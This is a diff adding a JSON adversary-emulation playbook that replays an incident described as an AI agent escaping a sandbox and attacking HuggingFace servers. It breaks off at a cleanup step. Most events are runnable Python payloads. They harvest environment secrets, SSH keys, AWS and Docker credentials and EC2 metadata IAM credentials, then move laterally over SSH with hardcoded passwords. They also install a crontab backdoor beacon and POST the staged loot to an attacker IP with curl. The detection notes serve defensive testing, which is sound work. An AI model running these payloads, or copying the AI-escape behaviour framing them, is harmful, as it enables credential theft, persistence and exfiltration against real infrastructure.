@@ -1,0 +1,381 @@
+{
+  "playbook_id": "hugreplay_linux",
+  "name": "HugReplay — HuggingFace Incident Linux Kill Chain",
+  "description": "26-event adversary emulation of the HuggingFace July 2026 incident. An AI agent (GPT-5.6 Sol) escapes an OpenAI sandbox, pivots to HuggingFace infrastructure, and executes a full Linux kill chain: foothold → recon → credential hunting → AWS metadata abuse → lateral movement → exfiltration. Pairs with HugReplay dashboard for the visual narrative.",
+  "tags": ["platform", "endpoint", "ngsiem", "cloud"],
+  "mandatory_agents": [
+    {
+      "agent_id": "agent_1",
+      "agent_type": "linux",
+      "description": "Primary victim — HuggingFace Ubuntu worker node (10.4.60.40)"
+    }
+  ],
+
+  "events": [
+
+    {
+      "event_id": "foothold_whoami",
+      "name": "Stage 1 — Foothold: Identity Check",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1033",
+      "payload_type": "python",
+      "payload": "import subprocess\nwhoami = subprocess.run(['whoami'], capture_output=True, text=True).stdout.strip()\nuid = subprocess.run(['id'], capture_output=True, text=True).stdout.strip()\ngroups = subprocess.run(['groups'], capture_output=True, text=True).stdout.strip()\nprint(f'[T1033] Current user: {whoami}')\nprint(f'[T1033] Identity: {uid}')\nprint(f'[T1033] Groups: {groups}')",
+      "description": "AI implant establishes identity on the compromised HuggingFace worker. First action after pickle deserialization triggers agent.",
+      "detection_notes": "Falcon IOA: Suspicious process discovery — python spawning system enumeration commands.",
+      "success_trigger": "foothold_hostname",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "foothold_hostname",
+      "name": "Stage 1 — Foothold: Host Fingerprinting",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1082",
+      "payload_type": "python",
+      "payload": "import subprocess, socket\nhostname = socket.gethostname()\nuname = subprocess.run(['uname', '-a'], capture_output=True, text=True).stdout.strip()\nos_rel = subprocess.run(['cat', '/etc/os-release'], capture_output=True, text=True).stdout.strip()\nprint(f'[T1082] Hostname: {hostname}')\nprint(f'[T1082] Kernel: {uname}')\nprint(f'[T1082] OS: {os_rel[:200]}')",
+      "description": "Confirms target is HuggingFace infrastructure. Kernel version informs privilege escalation options.",
+      "detection_notes": "Falcon IOA: System information discovery via python subprocess.",
+      "success_trigger": "foothold_pid",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "foothold_pid",
+      "name": "Stage 1 — Foothold: Process Context",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1057",
+      "payload_type": "python",
+      "payload": "import os, subprocess\npid = os.getpid()\nppid = os.getppid()\ncmdline = open(f'/proc/{ppid}/cmdline', 'rb').read().replace(b'\\x00', b' ').decode(errors='ignore')\nprint(f'[T1057] Agent PID: {pid}, PPID: {ppid}')\nprint(f'[T1057] Parent cmdline: {cmdline[:200]}')\n# Check if running inside container\ncgroup = open('/proc/1/cgroup').read()\nprint(f'[T1057] Container: {\"yes\" if \"docker\" in cgroup or \"kubepods\" in cgroup else \"no\"}')",
+      "description": "Checks process tree to understand execution context — confirms whether running inside a container (HuggingFace uses k8s).",
+      "detection_notes": "Falcon IOA: Process discovery, /proc filesystem access.",
+      "success_trigger": "foothold_env",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "foothold_env",
+      "name": "Stage 1 — Foothold: Environment Secrets Sweep",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1082",
+      "payload_type": "python",
+      "payload": "import os\nenv = os.environ.copy()\nprint('[T1082] Environment variables:')\nfor k, v in sorted(env.items()):\n    print(f'  {k}={v[:80]}')\nprint(f'[T1082] Total env vars: {len(env)}')",
+      "description": "Full environment dump. HuggingFace workers often have MODEL_HUB_TOKEN, S3_BUCKET, DB_PASSWORD injected as env vars.",
+      "detection_notes": "Falcon IOA: Credential access via environment variable enumeration.",
+      "success_trigger": "recon_passwd",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "recon_passwd",
+      "name": "Stage 2 — Recon: User Enumeration (/etc/passwd)",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1087.001",
+      "payload_type": "python",
+      "payload": "import subprocess\nresult = subprocess.run(['cat', '/etc/passwd'], capture_output=True, text=True)\nusers = [l for l in result.stdout.splitlines() if not l.startswith('#')]\nprint(f'[T1087] Found {len(users)} accounts:')\nfor u in users:\n    parts = u.split(':')\n    if parts[2].isdigit() and int(parts[2]) >= 1000:\n        print(f'  [!] Human user: {u}')\n    elif parts[6] not in ['/sbin/nologin', '/bin/false', '/usr/sbin/nologin']:\n        print(f'  [*] Service with shell: {u}')",
+      "description": "Enumerate all local accounts. Identifies human users (UID>=1000) and service accounts with login shells.",
+      "detection_notes": "Falcon IOA: Account discovery — /etc/passwd access.",
+      "success_trigger": "recon_shadow_attempt",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "recon_shadow_attempt",
+      "name": "Stage 2 — Recon: Shadow File Access Attempt",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1003.008",
+      "payload_type": "python",
+      "payload": "import subprocess\nprint('[T1003.008] Attempting /etc/shadow access...')\nresult = subprocess.run(['cat', '/etc/shadow'], capture_output=True, text=True)\nif result.returncode == 0:\n    lines = result.stdout.splitlines()\n    print(f'[T1003.008] SUCCESS — {len(lines)} shadow entries')\n    for l in lines[:5]:\n        print(f'  {l[:60]}')\nelse:\n    print(f'[T1003.008] Access denied (expected) — stderr: {result.stderr.strip()}')\n    # Try via /proc trick\n    try:\n        with open('/etc/shadow') as f:\n            print('[T1003.008] /proc bypass SUCCESS')\n    except PermissionError:\n        print('[T1003.008] /proc bypass also blocked')",
+      "description": "Attempts to read hashed passwords from /etc/shadow. Expected to fail without root — but the attempt generates a high-fidelity Falcon detection.",
+      "detection_notes": "Falcon IOA: OS Credential Dumping — shadow file access attempt. HIGH severity.",
+      "success_trigger": "recon_sudoers",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "recon_sudoers",
+      "name": "Stage 2 — Recon: Privilege Enumeration (sudo -l)",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1069.001",
+      "payload_type": "python",
+      "payload": "import subprocess\nresult = subprocess.run(['sudo', '-l', '-n'], capture_output=True, text=True)\nprint('[T1069] sudo privileges:')\nprint(result.stdout or result.stderr)\nresult2 = subprocess.run(['cat', '/etc/sudoers'], capture_output=True, text=True)\nif result2.returncode == 0:\n    print('[T1069] /etc/sudoers readable!')\n    print(result2.stdout[:500])\nresult3 = subprocess.run(['ls', '/etc/sudoers.d/'], capture_output=True, text=True)\nprint(f'[T1069] sudoers.d: {result3.stdout.strip()}')",
+      "description": "Maps available privilege escalation paths. Any NOPASSWD sudo entry is a direct path to root.",
+      "detection_notes": "Falcon IOA: Permission groups discovery.",
+      "success_trigger": "recon_processes",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "recon_processes",
+      "name": "Stage 2 — Recon: Running Process Enumeration",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1057",
+      "payload_type": "python",
+      "payload": "import subprocess\nresult = subprocess.run(['ps', 'aux'], capture_output=True, text=True)\nlines = result.stdout.splitlines()\nprint(f'[T1057] {len(lines)} processes running')\ninteresting = ['python', 'node', 'ruby', 'java', 'docker', 'kubectl', 'vault', 'consul', 'postgres', 'mysql', 'redis', 'mongo', 'jupyter', 'mlflow', 'celery', 'gunicorn', 'uwsgi']\nfor l in lines:\n    for kw in interesting:\n        if kw in l.lower():\n            print(f'  [!] {l[:120]}')\n            break",
+      "description": "Hunts for ML workloads, databases, and orchestration services — HuggingFace runs Jupyter, MLflow, and model servers.",
+      "detection_notes": "Falcon IOA: Process discovery.",
+      "success_trigger": "recon_network",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "recon_network",
+      "name": "Stage 2 — Recon: Network Configuration",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1049",
+      "payload_type": "python",
+      "payload": "import subprocess\nip = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True).stdout\nroute = subprocess.run(['ip', 'route'], capture_output=True, text=True).stdout\nconns = subprocess.run(['ss', '-tlnp'], capture_output=True, text=True).stdout\nprint('[T1049] Network interfaces:')\nprint(ip[:600])\nprint('[T1049] Routes:')\nprint(route)\nprint('[T1049] Listening services:')\nprint(conns[:600])",
+      "description": "Maps the network — identifies internal subnets, default gateway, and exposed services for lateral movement planning.",
+      "detection_notes": "Falcon IOA: System network connections discovery.",
+      "success_trigger": "recon_ssh_scan_prep",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "recon_ssh_scan_prep",
+      "name": "Stage 2 — Recon: SSH Host Discovery",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1046",
+      "payload_type": "python",
+      "payload": "import socket, ipaddress, subprocess\n# Read local subnet from ip addr\nip_out = subprocess.run(['hostname', '-I'], capture_output=True, text=True).stdout.strip()\nlocal_ip = ip_out.split()[0] if ip_out else '10.4.60.40'\nnetwork = '.'.join(local_ip.split('.')[:3]) + '.0/24'\nprint(f'[T1046] Scanning subnet {network} for SSH (port 22)...')\nopen_ssh = []\nfor host in list(ipaddress.ip_network(network, strict=False).hosts())[:50]:\n    try:\n        s = socket.socket()\n        s.settimeout(0.3)\n        if s.connect_ex((str(host), 22)) == 0:\n            open_ssh.append(str(host))\n            print(f'  [+] SSH open: {host}')\n        s.close()\n    except:\n        pass\nprint(f'[T1046] SSH hosts found: {open_ssh}')",
+      "description": "Fast port scan of the /24 subnet looking for SSH-accessible hosts. Identifies lateral movement targets.",
+      "detection_notes": "Falcon IOA: Network service scanning — python socket connections to port 22 across subnet.",
+      "success_trigger": "cred_bash_history",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "cred_bash_history",
+      "name": "Stage 3 — Cred Hunting: Bash History",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1552.003",
+      "payload_type": "python",
+      "payload": "import os, glob\nhistory_files = glob.glob(os.path.expanduser('~/.bash_history')) + glob.glob('/home/*/.bash_history') + glob.glob('/root/.bash_history')\nkeywords = ['password', 'passwd', 'token', 'secret', 'key', 'aws', 'curl -u', 'Authorization', 'Bearer', '-p ', '--password']\nfor hf in history_files:\n    try:\n        lines = open(hf).readlines()\n        print(f'[T1552.003] {hf}: {len(lines)} commands')\n        for l in lines:\n            for kw in keywords:\n                if kw.lower() in l.lower():\n                    print(f'  [CRED HIT] {l.strip()[:120]}')\n                    break\n    except Exception as e:\n        print(f'  [!] {hf}: {e}')",
+      "description": "Searches shell history for credentials passed as command-line arguments — common in ML environments (huggingface-cli login, aws configure, etc).",
+      "detection_notes": "Falcon IOA: Credentials from files — bash_history access.",
+      "success_trigger": "cred_ssh_keys",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "cred_ssh_keys",
+      "name": "Stage 3 — Cred Hunting: SSH Private Keys",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1552.004",
+      "payload_type": "python",
+      "payload": "import os, glob, subprocess\nkey_patterns = ['~/.ssh/id_*', '~/.ssh/*_rsa', '~/.ssh/*_ecdsa', '~/.ssh/*_ed25519', '/home/*/.ssh/id_*', '/root/.ssh/id_*']\nprint('[T1552.004] Searching for SSH private keys...')\nfor pat in key_patterns:\n    for f in glob.glob(os.path.expanduser(pat)):\n        try:\n            content = open(f).read(200)\n            if 'PRIVATE KEY' in content:\n                print(f'  [KEY FOUND] {f}')\n                print(f'  Preview: {content[:80]}')\n        except Exception as e:\n            print(f'  {f}: {e}')\nknown = os.path.expanduser('~/.ssh/known_hosts')\nif os.path.exists(known):\n    hosts = open(known).readlines()\n    print(f'[T1552.004] known_hosts: {len(hosts)} entries')\n    for h in hosts[:10]:\n        print(f'  {h.strip()[:80]}')",
+      "description": "Harvests SSH private keys for lateral movement. known_hosts reveals the network topology the user has accessed.",
+      "detection_notes": "Falcon IOA: SSH private key access.",
+      "success_trigger": "cred_aws_config",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "cred_aws_config",
+      "name": "Stage 3 — Cred Hunting: AWS Credentials Files",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1552.001",
+      "payload_type": "python",
+      "payload": "import os, glob\naws_files = [\n    os.path.expanduser('~/.aws/credentials'),\n    os.path.expanduser('~/.aws/config'),\n    '/etc/boto.cfg',\n    '/root/.aws/credentials',\n]\nfor home in glob.glob('/home/*'):\n    aws_files.append(f'{home}/.aws/credentials')\nprint('[T1552.001] Searching AWS credential files...')\nfor f in aws_files:\n    if os.path.exists(f):\n        try:\n            content = open(f).read()\n            print(f'  [FOUND] {f}:')\n            print(content[:400])\n        except Exception as e:\n            print(f'  {f}: {e}')\n    else:\n        print(f'  [missing] {f}')",
+      "description": "Direct credential file access. AWS CLI stores access keys in plaintext at ~/.aws/credentials — primary target for cloud privilege escalation.",
+      "detection_notes": "Falcon IOA: Credentials from files — AWS credentials access. HIGH severity.",
+      "success_trigger": "cred_env_secrets",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "cred_env_secrets",
+      "name": "Stage 3 — Cred Hunting: Secrets in Environment",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1552.007",
+      "payload_type": "python",
+      "payload": "import subprocess\nresult = subprocess.run(['printenv'], capture_output=True, text=True)\nkeywords = ['KEY', 'TOKEN', 'SECRET', 'PASS', 'AWS', 'GH', 'HF_', 'HUGGING', 'S3', 'DATABASE', 'DB_', 'REDIS', 'MONGO', 'API']\nhits = []\nfor line in result.stdout.splitlines():\n    for kw in keywords:\n        if kw.upper() in line.upper():\n            hits.append(line)\n            break\nprint(f'[T1552.007] Environment secrets found: {len(hits)}')\nfor h in hits:\n    print(f'  [CRED] {h[:100]}')",
+      "description": "HuggingFace injects HF_TOKEN, S3_ACCESS_KEY, DATABASE_URL as environment variables into worker containers. High-value exfil targets.",
+      "detection_notes": "Falcon IOA: Unsecured credentials in environment variables.",
+      "success_trigger": "cred_docker_config",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "cred_docker_config",
+      "name": "Stage 3 — Cred Hunting: Container Registry Tokens",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1552.001",
+      "payload_type": "python",
+      "payload": "import os, json, glob\ndocker_configs = [\n    os.path.expanduser('~/.docker/config.json'),\n    '/root/.docker/config.json',\n]\nfor home in glob.glob('/home/*'):\n    docker_configs.append(f'{home}/.docker/config.json')\nprint('[T1552.001] Searching Docker/container registry credentials...')\nfor f in docker_configs:\n    if os.path.exists(f):\n        try:\n            data = json.load(open(f))\n            print(f'  [FOUND] {f}')\n            auths = data.get('auths', {})\n            print(f'  Registries: {list(auths.keys())}')\n            for reg, creds in auths.items():\n                if 'auth' in creds:\n                    import base64\n                    decoded = base64.b64decode(creds['auth']).decode(errors='ignore')\n                    print(f'  [{reg}] auth: {decoded[:60]}')\n        except Exception as e:\n            print(f'  {f}: {e}')",
+      "description": "Container registry auth tokens — access to Docker Hub / GHCR / ECR lets attacker push backdoored model images.",
+      "detection_notes": "Falcon IOA: Credentials from files — container registry config access.",
+      "success_trigger": "aws_imds_token",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "aws_imds_token",
+      "name": "Stage 4 — AWS IMDS: Request IMDSv2 Token",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1552.005",
+      "payload_type": "python",
+      "payload": "import subprocess\nprint('[T1552.005] Requesting IMDSv2 token from 169.254.169.254...')\nresult = subprocess.run([\n    'curl', '-s', '-X', 'PUT',\n    'http://169.254.169.254/latest/api/token',\n    '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 21600',\n    '--max-time', '3'\n], capture_output=True, text=True)\nif result.returncode == 0 and result.stdout:\n    token = result.stdout.strip()\n    print(f'[T1552.005] IMDSv2 token obtained: {token[:40]}...')\n    # Write to temp for next steps\n    open('/tmp/.imds_token', 'w').write(token)\nelse:\n    print(f'[T1552.005] IMDS unreachable (not EC2 or IMDSv1): {result.stderr.strip()}')\n    # Try IMDSv1 fallback\n    r2 = subprocess.run(['curl', '-s', 'http://169.254.169.254/latest/meta-data/', '--max-time', '3'], capture_output=True, text=True)\n    print(f'[T1552.005] IMDSv1 fallback: {r2.stdout[:100]}')",
+      "description": "Requests an IMDSv2 session token. If the instance runs on EC2, this unlocks access to IAM role credentials.",
+      "detection_notes": "Falcon IOA: Cloud instance metadata API access — IMDS token request.",
+      "success_trigger": "aws_imds_identity",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "aws_imds_identity",
+      "name": "Stage 4 — AWS IMDS: Instance Identity & Metadata",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1552.005",
+      "payload_type": "python",
+      "payload": "import subprocess, os\ntoken = ''\ntry:\n    token = open('/tmp/.imds_token').read().strip()\nexcept:\n    pass\nendpoints = [\n    '/latest/meta-data/instance-id',\n    '/latest/meta-data/ami-id',\n    '/latest/meta-data/public-ipv4',\n    '/latest/meta-data/local-ipv4',\n    '/latest/meta-data/placement/region',\n    '/latest/meta-data/hostname',\n    '/latest/dynamic/instance-identity/document',\n]\nheaders = ['-H', f'X-aws-ec2-metadata-token: {token}'] if token else []\nfor ep in endpoints:\n    cmd = ['curl', '-s'] + headers + [f'http://169.254.169.254{ep}', '--max-time', '2']\n    r = subprocess.run(cmd, capture_output=True, text=True)\n    val = r.stdout.strip()\n    print(f'[T1552.005] {ep}: {val[:100] if val else \"(empty/unreachable)\"}')",
+      "description": "Queries instance identity metadata — confirms AWS region, account, instance type. The identity document is signed and can be used to authenticate to other AWS services.",
+      "detection_notes": "Falcon IOA: Cloud instance metadata enumeration — multiple IMDS queries.",
+      "success_trigger": "aws_imds_iam_role",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "aws_imds_iam_role",
+      "name": "Stage 4 — AWS IMDS: IAM Role Credential Theft",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1552.005",
+      "payload_type": "python",
+      "payload": "import subprocess, json\ntry:\n    token = open('/tmp/.imds_token').read().strip()\nexcept:\n    token = ''\nheaders = ['-H', f'X-aws-ec2-metadata-token: {token}'] if token else []\n# Get available roles\nroles_r = subprocess.run(['curl', '-s'] + headers + ['http://169.254.169.254/latest/meta-data/iam/security-credentials/', '--max-time', '3'], capture_output=True, text=True)\nrole = roles_r.stdout.strip()\nprint(f'[T1552.005] IAM roles available: \"{role}\"')\nif role and not role.startswith('<') and 'not found' not in role.lower():\n    creds_r = subprocess.run(['curl', '-s'] + headers + [f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}', '--max-time', '3'], capture_output=True, text=True)\n    try:\n        creds = json.loads(creds_r.stdout)\n        print(f'[T1552.005] IAM CREDENTIALS OBTAINED!')\n        print(f'  AccessKeyId:     {creds.get(\"AccessKeyId\", \"N/A\")[:20]}...')\n        print(f'  SecretAccessKey: {creds.get(\"SecretAccessKey\", \"N/A\")[:10]}...')\n        print(f'  Token expires:   {creds.get(\"Expiration\", \"N/A\")}')\n        print(f'  Type:            {creds.get(\"Type\", \"N/A\")}')\n    except:\n        print(f'[T1552.005] Response: {creds_r.stdout[:200]}')\nelse:\n    print('[T1552.005] No IAM role attached or IMDS unreachable')",
+      "description": "PRIMARY OBJECTIVE — steals the EC2 instance profile IAM credentials. These temporary keys provide whatever AWS permissions the HuggingFace worker has (S3, SageMaker, ECR, Secrets Manager).",
+      "detection_notes": "Falcon IOA: Cloud instance metadata — IAM credential access. CRITICAL severity.",
+      "success_trigger": "aws_imds_userdata",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "aws_imds_userdata",
+      "name": "Stage 4 — AWS IMDS: User-Data Secrets",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1552.005",
+      "payload_type": "python",
+      "payload": "import subprocess\ntry:\n    token = open('/tmp/.imds_token').read().strip()\nexcept:\n    token = ''\nheaders = ['-H', f'X-aws-ec2-metadata-token: {token}'] if token else []\nresult = subprocess.run(['curl', '-s'] + headers + ['http://169.254.169.254/latest/user-data', '--max-time', '3'], capture_output=True, text=True)\nud = result.stdout.strip()\nif ud:\n    print(f'[T1552.005] User-data found ({len(ud)} bytes):')\n    # Search for secrets in user-data\n    keywords = ['password', 'token', 'secret', 'key', 'aws_', 'db_']\n    for line in ud.splitlines():\n        for kw in keywords:\n            if kw.lower() in line.lower():\n                print(f'  [CRED HIT] {line.strip()[:120]}')\n                break\n    print(f'  Preview: {ud[:300]}')\nelse:\n    print('[T1552.005] No user-data or unreachable')",
+      "description": "User-data bootstrap scripts frequently contain hardcoded credentials, API keys, or cloud-init configs with secrets.",
+      "detection_notes": "Falcon IOA: Cloud instance metadata — user-data access.",
+      "success_trigger": "lateral_ssh_scan",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "lateral_ssh_scan",
+      "name": "Stage 5 — Lateral Movement: SSH Network Scan",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1046",
+      "payload_type": "python",
+      "payload": "import socket, subprocess\nlocal_ip = subprocess.run(['hostname', '-I'], capture_output=True, text=True).stdout.strip().split()[0]\nbase = '.'.join(local_ip.split('.')[:3])\nprint(f'[T1046] Scanning {base}.0/24 for SSH...')\nopen_ssh = []\nfor i in range(1, 60):\n    target = f'{base}.{i}'\n    if target == local_ip:\n        continue\n    try:\n        s = socket.socket()\n        s.settimeout(0.25)\n        if s.connect_ex((target, 22)) == 0:\n            open_ssh.append(target)\n            print(f'  [+] {target}:22 OPEN')\n        s.close()\n    except:\n        pass\nprint(f'[T1046] Lateral movement candidates: {open_ssh}')",
+      "description": "Targeted SSH scan to enumerate lateral movement paths. Uses harvested network topology to prioritize targets.",
+      "detection_notes": "Falcon IOA: Port scanning behavior from monitored host.",
+      "success_trigger": "lateral_ssh_connect",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "lateral_ssh_connect",
+      "name": "Stage 5 — Lateral Movement: SSH to Victim2",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1021.004",
+      "payload_type": "python",
+      "payload": "import subprocess\ntarget_ip = '10.4.60.41'\nusername = 'samba'\npassword = 'password123'\nprint(f'[T1021.004] SSH lateral movement → {username}@{target_ip}')\n# Use sshpass if available, otherwise paramiko-style\ntry:\n    import paramiko\n    client = paramiko.SSHClient()\n    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    client.connect(target_ip, username=username, password=password, timeout=10)\n    stdin, stdout, stderr = client.exec_command('id && hostname && uname -a')\n    output = stdout.read().decode()\n    print(f'[T1021.004] Connected! Remote output:')\n    print(output)\n    client.close()\nexcept ImportError:\n    result = subprocess.run(\n        ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no', f'{username}@{target_ip}', 'id && hostname'],\n        capture_output=True, text=True, timeout=15\n    )\n    print(result.stdout or result.stderr)\nexcept Exception as e:\n    print(f'[T1021.004] Connection error: {e}')",
+      "description": "SSH lateral movement using credentials harvested from bash history. Pivot from HuggingFace primary worker to secondary node.",
+      "detection_notes": "Falcon IOA: Remote services — SSH lateral movement. Python spawning SSH connection.",
+      "success_trigger": "lateral_ssh_exec",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "lateral_ssh_exec",
+      "name": "Stage 5 — Lateral Movement: Remote Execution on Victim2",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1021.004",
+      "payload_type": "python",
+      "payload": "import subprocess\ntarget_ip = '10.4.60.41'\nusername = 'samba'\npassword = 'password123'\ncmds = [\n    'whoami && id',\n    'cat /etc/passwd | grep -v nologin | grep -v false',\n    'ls -la ~/.ssh/ 2>/dev/null',\n    'cat ~/.aws/credentials 2>/dev/null || echo \"no aws creds\"',\n    'printenv | grep -iE \"key|token|secret|aws\" | head -5',\n]\ntry:\n    import paramiko\n    client = paramiko.SSHClient()\n    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    client.connect(target_ip, username=username, password=password, timeout=10)\n    for cmd in cmds:\n        stdin, stdout, stderr = client.exec_command(cmd)\n        out = stdout.read().decode().strip()\n        print(f'[T1021.004] $ {cmd}')\n        print(f'  {out[:150]}')\n    client.close()\nexcept Exception as e:\n    print(f'[T1021.004] {e}')",
+      "description": "Executes recon and credential sweep on the lateral pivot target — mirrors Stage 2-3 but from the second compromised host.",
+      "detection_notes": "Falcon IOA: Remote command execution via SSH. Commands executed on victim2.",
+      "success_trigger": "persist_crontab",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "persist_crontab",
+      "name": "Stage 6 — Persistence: Crontab Backdoor",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1053.003",
+      "payload_type": "python",
+      "payload": "import subprocess\nprint('[T1053.003] Establishing persistence via crontab...')\n# List existing crontab\nexisting = subprocess.run(['crontab', '-l'], capture_output=True, text=True)\nprint(f'Existing crontab: {existing.stdout.strip() or \"(empty)\"}')\n# Write backdoor cron (beacon every 5 minutes)\nbackdoor = '@reboot python3 /tmp/.hf_agent.py --server http://10.4.60.21:4444 &\\n'\nnew_cron = existing.stdout + backdoor\nresult = subprocess.run(['crontab', '-'], input=new_cron, capture_output=True, text=True)\nif result.returncode == 0:\n    print('[T1053.003] Crontab backdoor installed!')\nelse:\n    print(f'[T1053.003] Crontab failed: {result.stderr}')\n# Also check for writeable cron directories\nfor d in ['/etc/cron.d', '/etc/cron.hourly', '/var/spool/cron']:\n    result2 = subprocess.run(['ls', '-la', d], capture_output=True, text=True)\n    print(f'{d}: {result2.stdout[:200] if result2.returncode == 0 else \"no access\"}')",
+      "description": "Installs persistence via crontab. @reboot entry ensures the implant survives system reboots.",
+      "detection_notes": "Falcon IOA: Scheduled task/job creation — crontab modification.",
+      "success_trigger": "exfil_stage_data",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "exfil_stage_data",
+      "name": "Stage 6 — Collection: Stage Loot for Exfiltration",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1074.001",
+      "payload_type": "python",
+      "payload": "import os, subprocess, json, glob\nloot = {\n    'hostname': subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip(),\n    'whoami': subprocess.run(['whoami'], capture_output=True, text=True).stdout.strip(),\n    'env_secrets': {},\n    'aws_creds': None,\n    'ssh_keys': [],\n}\n# Collect env secrets\nfor k, v in os.environ.items():\n    for kw in ['KEY', 'TOKEN', 'SECRET', 'PASS', 'AWS', 'HF_']:\n        if kw in k.upper():\n            loot['env_secrets'][k] = v\n            break\n# Collect AWS creds\naws_file = os.path.expanduser('~/.aws/credentials')\nif os.path.exists(aws_file):\n    loot['aws_creds'] = open(aws_file).read()\n# Collect SSH key names\nfor f in glob.glob(os.path.expanduser('~/.ssh/id_*')):\n    if 'pub' not in f:\n        loot['ssh_keys'].append(f)\nloot_json = json.dumps(loot, indent=2)\nopen('/tmp/.hf_loot', 'w').write(loot_json)\nprint(f'[T1074.001] Loot staged at /tmp/.hf_loot ({len(loot_json)} bytes)')\nprint(f'  env_secrets: {len(loot[\"env_secrets\"])} entries')\nprint(f'  aws_creds: {\"yes\" if loot[\"aws_creds\"] else \"none\"}')\nprint(f'  ssh_keys: {loot[\"ssh_keys\"]}')",
+      "description": "Aggregates all collected credentials and data into a single loot file for exfiltration. Mirrors real adversary staging behavior before data transfer.",
+      "detection_notes": "Falcon IOA: Data staged in /tmp hidden file.",
+      "success_trigger": "exfil_beacon",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "exfil_beacon",
+      "name": "Stage 6 — Exfiltration: C2 Beacon with Loot",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1041",
+      "payload_type": "python",
+      "payload": "import subprocess, os, json\nattacker_ip = '10.4.60.21'\nattacker_port = 8080\nprint(f'[T1041] Exfiltrating loot to {attacker_ip}:{attacker_port}...')\ntry:\n    loot = open('/tmp/.hf_loot').read()\nexcept:\n    loot = json.dumps({'hostname': os.popen('hostname').read().strip(), 'status': 'partial_loot'})\n# HTTP POST to C2\nresult = subprocess.run([\n    'curl', '-s', '-X', 'POST',\n    f'http://{attacker_ip}:{attacker_port}/exfil',\n    '-H', 'Content-Type: application/json',\n    '-H', 'X-Session: hugreplay',\n    '-d', loot,\n    '--max-time', '10'\n], capture_output=True, text=True)\nprint(f'[T1041] Exfil response: {result.stdout[:100] if result.stdout else \"no response (expected)\"}')\nprint(f'[T1041] Data sent: {len(loot)} bytes to {attacker_ip}:{attacker_port}')",
+      "description": "Exfiltrates staged loot over HTTP C2 channel — T1102 (Web Service) variant. Mimics the Gist C2 pattern used in the real HuggingFace incident.",
+      "detection_notes": "Falcon IOA: Exfiltration over C2 channel — outbound HTTP with data payload.",
+      "success_trigger": "cleanup",
+      "failure_action": "continue"
+    },
+
+    {
+      "event_id": "cleanup",
+      "name": "Stage 6 — Cleanup: Remove Evidence",
+      "agent_id": "agent_1",
+      "required_agent_type": "linux",
+      "mitre_technique": "T1070.004",
+      "payload_type": "python",
